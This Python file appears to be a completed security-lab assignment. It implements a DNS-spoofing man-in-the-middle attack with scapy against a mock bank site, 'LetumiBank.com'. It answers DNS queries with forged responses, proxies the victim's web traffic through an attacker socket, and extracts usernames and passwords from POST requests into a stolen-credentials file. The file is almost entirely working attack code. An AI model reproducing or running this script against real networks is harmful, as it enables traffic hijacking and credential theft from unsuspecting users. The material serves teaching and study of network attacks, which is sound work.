import os
import argparse
import socket
from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR, IP, UDP
import re

conf.L3socket = L3RawSocket
WEB_PORT = 8000
DNS_PORT = 53
MAX_MSG = 50000
BPF_FILTER = f"port {DNS_PORT}"
NET_INTERFACE = "lo"
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.1.1.1"


def log_credentials(username, password):
    # Write stolen credentials out to file.
    # Do not change this.
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
    # Take a block of client data and search for username/password credentials.
    # If found, log the credentials to the system by calling log_credentials().
    data = client_data.decode()
    re.compile(data)
    user_match = re.search("username=(\'.*?\')", data)
    pass_match = re.search("password=(\'.*?\')", data)
    if (user_match != None) and (pass_match != None):
        log_credentials(user_match.group(1), pass_match.group(1))


def handle_tcp_forwarding(client_socket, client_ip, hostname):
    # Continuously intercept new connections from the client
    # and initiate a connection with the host in order to forward data
    # client_socket = attacker_is_server_socket, client_ip = attacker_ip
    real_hostname_ip = resolve_hostname(hostname)
    exit_flag = False
    while True:
        # accept a new connection from the client on client_socket and create a new socket to connect to the actual
        # host associated with hostname.
        conn, addr = client_socket.accept()
        with conn:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attacker_is_client_socket:
                attacker_is_client_socket.connect((real_hostname_ip, WEB_PORT))
                # read data from client socket, check for credentials, and forward along to host socket.
                # Check for POST to '/post_logout' and exit after that request has completed.

                # get data from client
                data = conn.recv(MAX_MSG)
                if -1 != data.decode().find("POST"):
                    if -1 != data.decode().find("/post_logout"):
                        exit_flag = True
                    check_credentials(data)

                # forward to real server
                attacker_is_client_socket.send(data)
                # Receive data from real server
                data_from_real_server = attacker_is_client_socket.recv(MAX_MSG)
                # forward to client
                conn.send(data_from_real_server)

                if exit_flag:
                    exit()


def dns_callback(packet, extra_args):
    # callback function for handling DNS packets.
    # Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
    domain_name = packet[DNSQR].qname.decode().lower()
    if (DNS in packet) and (packet[DNS].ancount == 0) and (-1 != domain_name.find(HOSTNAME.lower())):
        # build spoofed DNS response
        dns_spoff_res = (IP(src=packet[IP].dst, dst=packet[IP].src)/UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, qr=1, aa=1, ancount=1,an=DNSRR(rdata=extra_args[0], rrname=HOSTNAME)))
        send(dns_spoff_res, iface=NET_INTERFACE)
        # extra_args[1]=attacker_is_server_socket , extra_args[0]=source_ip(attackers)
        handle_tcp_forwarding(extra_args[1], extra_args[0], HOSTNAME)


def sniff_and_spoof(source_ip):
    # Open a socket and bind it to the attacker's IP and WEB_PORT.
    # This socket will be used to accept connections from victimized clients.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attacker_is_server_socket:
        attacker_is_server_socket.bind((source_ip, WEB_PORT))
        attacker_is_server_socket.listen()

        # sniff for DNS packets on the network. Make sure to pass source_ip
        # and the socket you created as extra callback arguments.
        sniff(filter=BPF_FILTER, iface=NET_INTERFACE,
              prn=lambda packet_arg: dns_callback(packet_arg, [source_ip, attacker_is_server_socket]))


def main():
    parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
    args = parser.parse_args()

    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir.
    # Do not change this.
    abspath = os.path.abspath(__file__)
    dirname = os.path.dirname(abspath)
    os.chdir(dirname)
    main()
